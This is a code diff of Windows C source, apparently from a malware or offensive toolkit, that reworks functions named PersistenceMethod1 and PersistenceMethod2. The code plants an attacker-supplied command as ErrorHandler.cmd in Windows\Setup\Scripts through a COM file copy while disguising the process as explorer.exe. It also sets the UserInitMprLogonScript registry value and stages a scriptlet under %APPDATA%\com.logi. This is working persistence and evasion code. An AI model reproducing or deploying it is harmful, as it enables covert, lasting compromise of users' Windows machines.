@@ -162,74 +162,6 @@ CLEANUP:
 	return Result;
 }
 
-BOOL SetupScriptMethod
-(
-	_In_ LPSTR lpCommandLine
-)
-{
-	PBYTE pCmdContent = NULL;
-	DWORD cbCmdContent = 0;
-	BOOL Result = FALSE;
-	LPWSTR lpCmdPath = NULL;
-	WCHAR wszDest[MAX_PATH];
-
-	cbCmdContent = lstrlenA(lpCommandLine) + lstrlenA("@echo off\n");
-	pCmdContent = ALLOC(cbCmdContent + 1);
-	wsprintfA(pCmdContent, "@echo off\n%s", lpCommandLine);
-	if (!WriteToTempPath(pCmdContent, cbCmdContent, L"cmd", &lpCmdPath)) {
-		goto CLEANUP;
-	}
-
-	RtlSecureZeroMemory(wszDest, sizeof(wszDest));
-	GetWindowsDirectoryW(wszDest, MAX_PATH);
-	lstrcatW(wszDest, L"\\Setup\\Scripts");
-	if (!MasqueradedMoveCopyDirectoryFileCOM(lpCmdPath, wszDest, TRUE)) {
-		goto CLEANUP;
-	}
-
-	Result = TRUE;
-CLEANUP:
-	FREE(pCmdContent);
-	FREE(lpCmdPath);
-
-	return Result;
-}
-
-BOOL PersistenceMethod1
-(
-	_In_ LPSTR lpCommandLine
-)
-{
-	LSTATUS Status = STATUS_SUCCESS;
-	BOOL Result = FALSE;
-	WCHAR wszSetupPath[MAX_PATH];
-	WCHAR wszExplorerPath[MAX_PATH];
-	LPWSTR BackupPath[5];
-
-	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
-	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
-	lstrcatW(wszExplorerPath, L"\\explorer.exe");
-	RtlSecureZeroMemory(BackupPath, sizeof(BackupPath));
-	MasqueradeProcessPath(wszExplorerPath, FALSE, BackupPath);
-	RtlSecureZeroMemory(wszSetupPath, sizeof(wszSetupPath));
-	GetSystemDirectoryW(wszSetupPath, _countof(wszSetupPath));
-	lstrcatW(wszSetupPath, L"\\oobe\\Setup.exe");
-	Status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript", REG_SZ, wszSetupPath, (lstrlenW(wszSetupPath) + 1) * sizeof(WCHAR));
-	if (!NT_SUCCESS(Status)) {
-		LOG_ERROR("RegSetKeyValueW", Status);
-		goto CLEANUP;
-	}
-
-	if (!SetupScriptMethod(lpCommandLine)) {
-		goto CLEANUP;
-	}
-
-	Result = TRUE;
-CLEANUP:
-	MasqueradeProcessPath(NULL, TRUE, BackupPath);
-	return Result;
-}
-
 BOOL PersistenceMethod2
 (
 	_In_ LPSTR lpCommandLine
@@ -249,6 +181,7 @@ BOOL PersistenceMethod2
 	LPSTR lpDefaultValue = NULL;
 	LPWSTR lpTempPath = NULL;
 	LPSTR lpReformatedCommand = NULL;
+	DWORD dwLastError = ERROR_SUCCESS;
 
 	Status = RegOpenKeyExA(HKEY_CURRENT_USER, szTypeLibPath, 0, KEY_READ, &hKey);
 	if (Status != ERROR_PATH_NOT_FOUND && Status != ERROR_FILE_NOT_FOUND) {
@@ -283,8 +216,11 @@ BOOL PersistenceMethod2
 	lpSctPath = ALLOC(MAX_PATH);
 	ExpandEnvironmentStringsA("%APPDATA%\\com.logi", lpSctPath, MAX_PATH);
 	if (!CreateDirectoryA(lpSctPath, NULL)) {
-		LOG_ERROR("CreateDirectoryA", GetLastError());
-		goto CLEANUP;
+		dwLastError = GetLastError();
+		if (dwLastError != ERROR_ALREADY_EXISTS) {
+			LOG_ERROR("CreateDirectoryA", dwLastError);
+			goto CLEANUP;
+		}
 	}
 
 	lpReformatedCommand = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
@@ -350,6 +286,55 @@ CLEANUP:
 
 	if (lpReformatedCommand != NULL) {
 		FREE(lpReformatedCommand);
+	}
+
+	return Result;
+}
+
+BOOL PersistenceMethod1
+(
+	_In_ LPSTR lpCommandLine
+)
+{
+	BOOL Result = FALSE;
+	WCHAR wszWindowsPath[MAX_PATH];
+	LPWSTR lpTempPath = NULL;
+	BOOL CreateTempFile = FALSE;
+	WCHAR wszExplorerPath[MAX_PATH];
+	LPWSTR OldPath[5];
+	WCHAR wszNullStr[0x10];
+	BOOL RestoreProcessPath = FALSE;
+
+	GenerateTempPathW(L"ErrorHandler.cmd", NULL, NULL, &lpTempPath);
+	GetWindowsDirectoryW(wszWindowsPath, _countof(wszWindowsPath));
+	lstrcatW(wszWindowsPath, L"\\Setup\\Scripts");
+	if (!WriteToFile(lpTempPath, lpCommandLine, lstrlenA(lpCommandLine))) {
+		goto CLEANUP;
+	}
+
+	CreateTempFile = TRUE;
+	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
+	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
+	lstrcatW(wszExplorerPath, L"\\explorer.exe");
+	SecureZeroMemory(OldPath, sizeof(OldPath));
+	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
+	RestoreProcessPath = TRUE;
+	if (!MasqueradedMoveCopyDirectoryFileCOM(lpTempPath, wszWindowsPath, FALSE)) {
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (RestoreProcessPath) {
+		MasqueradeProcessPath(NULL, TRUE, OldPath);
+	}
+
+	if (IsFileExist(lpTempPath)) {
+		DeleteFileW(lpTempPath);
+	}
+
+	if (lpTempPath != NULL) {
+		FREE(lpTempPath);
 	}
 
 	return Result;
